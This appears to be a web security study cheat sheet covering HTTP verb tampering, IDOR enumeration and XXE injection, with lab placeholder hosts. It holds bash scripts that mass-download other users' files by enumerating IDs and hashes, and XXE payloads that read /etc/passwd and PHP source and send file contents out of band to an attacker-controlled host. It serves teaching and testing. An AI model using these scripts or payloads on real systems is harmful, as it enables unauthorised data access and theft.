# Web Attacks

## [HTTP Verb Tampering](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/03-Testing_for_HTTP_Verb_Tampering)

### [HTTP Request Methods](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Methods)

| Verb    | Description                                                                 |
|---------|-----------------------------------------------------------------------------|
| HEAD    | Identical to a GET request, but its response only contains the headers, without the response body |
| PUT     | Writes the request payload to the specified location                        |
| DELETE  | Deletes the resource at the specified location                              |
| OPTIONS | Shows different options accepted by a web server, like accepted HTTP verbs  |
| PATCH   | Apply partial modifications to the resource at the specified location       |

| Command | Description |
|---------|-------------|
| `-X OPTIONS` | Set HTTP Method with Curl |

### Example Vulnerability

The below code is designed to mitigate SQLi. However, it is only being applied to GET requests

``` php
$pattern = "/^[A-Za-z\s]+$/";

if(preg_match($pattern, $_GET["code"])) {
    $query = "Select * from ports where port_code like '%" . $_REQUEST["code"] . "%'";
    ...SNIP...
}
```

### Explointing

- Trial and error change Verb in intercepted requests in burp.
- `#!bash curl -i -X OPTIONS http://SERVER_IP:PORT/` to see what verbs are accepted.

## [Insecure Direct Object Referencing (IDOR)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)

### Identify IDORs

- In URL parameters & APIs (`?uid=1` or `?filename=file_1.pdf`)
- In AJAX Calls (find functions only available to admin users)
``` javascript
function changeUserPassword() {
    $.ajax({
        url:"change_password.php",
        type: "post",
        dataType: "json",
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success:function(result){
            //
        }
    });
}
```
- By understanding reference hashing/encoding (`download.php?filename=c81e728d9d4c2f636f067f89cc14862c`)
``` javascript
$.ajax({
    url:"download.php",
    type: "post",
    dataType: "json",
    data: {filename: CryptoJS.MD5('file_1.pdf').toString()},
    success:function(result){
        //
    }
});
```
- By comparing user roles and api calls available to users, user 2 may not have the below api call available but if we know it exists we could attempt to make it whilst logged in as user 2.
``` json
{
  "attributes" : 
    {
      "type" : "salary",
      "url" : "/services/data/salaries/users/1"
    },
  "Id" : "1",
  "Name" : "User1"

}
```
- Predictable file naming patterns
``` html
/documents/Invoice_1_09_2021.pdf
/documents/Report_1_10_2021.pdf
<!-- changing the get parameter uid from 1 to 2 may cause the available files to change to: -->
/documents/Invoice_2_09_2021.pdf
/documents/Report_2_10_2021.pdf
<!-- there may also be filters (uid_filter=1) that can be changed or removed to show other files -->
```

### Mass IDOR Enumeration

If we find the example files from the previous example in the html code:
``` html
<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```
We could write the following script to mass download them
``` bash
#!/bin/bash

url="$1" # bash script.sh http://STMIP:STMPO or http://URL to run command and pass the URL

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do # *? matches 0 or more of . (any char)
                wget -q $url/$link # http://SERVER_IP:PORT/
        done
done
```

### Hashed IDOR

The following function takes the IDOR value base64 encodes it and then hashes it.
``` javascript
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```
In which case we would recreate that before passing the value:
``` bash
echo -n 1 | base64 -w 0 | md5sum
```
and pass the value to mass download files:
``` bash
#!/bin/bash

for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
    done
done
```

### Insecure APIs

![API call](../images/idor-api-request.jpg)
- The above API is making updates (PUT /profile/api.php/profile/1) to Full Name, Email, and About Me.
- It has hidden parameters uid, uuid, and role.
- The role is also present as a cookin (Cookie: role=employee)
- We could try changing to a GET request and changing the endpoint to get other users details
- If we found an admins uuid we could then use that alon with changing the uid and role to make changes/create users that we couldn't as a user role.

| Command | Description |
|---------|-------------|
| `md5sum` | MD5 hash a string |
| `base64` | Base64 encode a string |

## [XML External Entity (XXE) Injection](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)

### XML

``` xml
<?xml version="1.0" encoding="UTF-8"?>
<email>
  <date>01-01-2022</date>
  <time>10:00 am UTC</time>
  <sender>john@inlanefreight.com</sender>
  <recipients>
    <to>HR@inlanefreight.com</to>
    <cc>
        <to>billing@inlanefreight.com</to>
        <to>payslips@inlanefreight.com</to>
    </cc>
  </recipients>
  <body>
  Hello,
      Kindly share with me the invoice for the payment made on January 1, 2022.
  Regards,
  John
  </body> 
</email>
```

| Key        | Definition                                                                 | Example                          |
|------------|----------------------------------------------------------------------------|----------------------------------|
| Tag       | The keys of an XML document, usually wrapped with </> characters.          | `<date>`                         |
| Entity    | XML variables, usually wrapped with &/; characters.                        | `&lt;`                             |
| Element   | The root element or any of its child elements, and its value is stored in between a start-tag and an end-tag. | `<date>01-01-2022</date>`         |
| Attribute | Optional specifications for any element that are stored in the tags, which may be used by the XML parser. | `version="1.0"/encoding="UTF-8"`  |
| Declaration | Usually the first line of an XML document, and defines the XML version and encoding to use when parsing it. | `<?xml version="1.0" encoding="UTF-8"?>` |

### XML Document Type Definition (DTD)

Defines an XML documents structure/can be validated against



Referenced within the XML document itself

``` xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "email.dtd">
```
or
``` xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "http://inlanefreight.com/email.dtd">
```
Defining XML variables in DTD
``` xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```
The above defined company variable can be referenced in the XML document like this: `&company;`
Variables can also be referenced externally using the SYSTEM (or PUBLIC) keyword:
``` xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "http://localhost/company.txt">
  <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
]>
```

| Code | Description |
|------|-------------|
| `<!ENTITY xxe SYSTEM "http://localhost/email.dtd">` | Define External Entity to a URL |
| `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | Define External Entity to a file path |
| `<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">` | Read PHP source code with base64 encode filter |
| `<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">` | Reading a file through a PHP error |
| `<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">` | Reading a file OOB exfiltration |